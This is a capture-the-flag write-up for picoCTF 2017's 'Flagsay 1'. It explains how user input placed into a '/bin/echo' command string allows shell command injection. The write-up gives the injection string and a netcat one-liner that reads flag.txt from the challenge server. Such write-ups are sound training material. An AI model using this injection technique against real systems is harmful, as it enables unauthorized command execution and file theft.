# Flagsay 1

I heard you like flags, so now you can make your own! Exhilarating! Use flagsay-1! Source. Connect on shell2017.picoctf.com:19094.
HINTS
System will run exactly what the program gives it
```

Since the program just runs the command that we give it, we just have to cat the flag and then pass that result back to the terminal. There is a catch, however, the commandBase string already contains a command.

```C
char commandBase[] = "/bin/echo \"%s\"\n";
```

We can execute a new command on top of the existing one by separating our commands from it with '&&.' We will need to cat the contents of flag.txt and then echo it to the console like so.

```
" && cat flag.txt && echo"
```

We pipe that text into the netcat application with the following python command, akin to an echo -e. 

```
python -c "print '\" && cat flag.txt && echo\"'" | nc shell2017.picoctf.com 19094
```

The result yields the contents of flag.txt.
